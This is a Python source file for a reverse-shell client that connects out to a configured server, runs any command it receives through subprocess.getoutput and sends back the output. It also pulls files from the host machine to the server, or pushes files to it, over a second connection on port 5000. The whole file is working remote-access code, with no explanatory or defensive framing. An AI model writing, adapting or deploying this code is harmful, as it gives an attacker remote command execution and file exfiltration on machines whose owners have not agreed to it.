import socket, os, subprocess, sys, re, platform, tqdm
from datetime import datetime

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 8080
BUFFER_SIZE = 1440
SEPARATOR = "<sep>"

class Client:
  def __init__(self, host, port, verbose=False):
    self.host = host
    self.port = port
    self.verbose = verbose
    self.socket = self.connect_to_server()
    self.cwd = None
  def connect_to_server(self, custom_port=None):
    soc = socket.socket()
    if custom_port:
      port = custom_port
    else:
      port = self.port
    if self.verbose:
      print(f"Connecting to {self.host}:{port}")
    soc.connect((self.host, port))
    if self.verbose:
      print("Connected ...")
    return soc
  def start(self):
    self.cwd = os.getcwd()
    self.socket.send(self.cwd.encode())
    while True:
      command = self.socket.recv(BUFFER_SIZE).decode()
      output = self.handle_command(command)
      if output == "abort":
        break
      elif output in ["exit", "quit"]:
        continue
      self.cwd = os.getcwd()
      message = f"{output}{SEPARATOR}{self.cwd}"
      self.socket.sendall(message.encode())
    self.socket.close()
  def handle_command(self, command):
    if self.verbose:
      print(f"Executing command: {command}.")
    if command.lower() in ["quit", "exit"]:
      output = "exit"
    elif command.lower() == "abort":
      output = "abort"
    elif (match := re.search(r"cd\s*(.*)", command)):
      output = self.change_direcory(match.group(1))
    elif (match := re.search(r"download\s*(.*)", command)):
      filename = match.group(1)
      if os.path.isfile(filename):
        output = f"Sending {filename}.. "
        self.send_file(filename)
      else:
        output = f"File {filename} does not exist!"
    elif (match := re.search(r"upload\s*(.*)", command)):
      filename = match.group(1)
      output = f"Recive {filename}."
      self.recive_file()
    else:
      output = subprocess.getoutput(command)
    return output
  def change_direcory(self, path):
    if not path:
      return ""
    try:
      os.chdir(path)
    except FileNotFoundError as e:
      output = str(e)
    else:
      output = ""
    return output
  def recive_file(self, port=5000):
    soc = self.connect_to_server(custom_port=port)
    Client._recive_file(soc, verbose=self.verbose)
  def send_file(self, filename, port=5000):
    soc = self.connect_to_server(custom_port=port)
    Client._send_file(soc, filename, verbose=self.verbose)
  @classmethod
  def _recive_file(cls, soc: socket.socket, buffer_size=4069, verbose=False):
    recived = soc.recv(buffer_size).decode()
    filename, filesize = recived.split(SEPARATOR)
    filename = os.path.basename(filename)
    filesize = int(filesize)
    if verbose:
      progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    else:
      progress = None
    with open(filename, 'wb') as f:
      while True:
        bytes_read = soc.recv(buffer_size)
        if not bytes_read:
          break
        f.write(bytes_read)
        if verbose:
          progress.update(len(bytes_read))
    soc.close()
  @classmethod
  def _send_file(cls, soc: socket.socket, filename, buffer_size=4069, verbose=False):
    filesize = os.path.getsize(filename)
    soc.send(f"{filename}{SEPARATOR}{filesize}".encode())
    if verbose:
      progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    else:
      progress = None
    with open(filename, 'rb') as f:
      while True:
        bytes_read = f.read(buffer_size)
        if not bytes_read:
          break
        soc.sendall(bytes_read)
        if verbose:
          progress.update(len(bytes_read))
    soc.close()
if __name__ == "__main__":
  #while True:
  #  try:
  #    client = Client(SERVER_HOST, SERVER_PORT, verbose=True)
  #    client.start()
  #  except Exception as e:
  #    print(e)
  client = Client(SERVER_HOST, SERVER_PORT)
  client.start()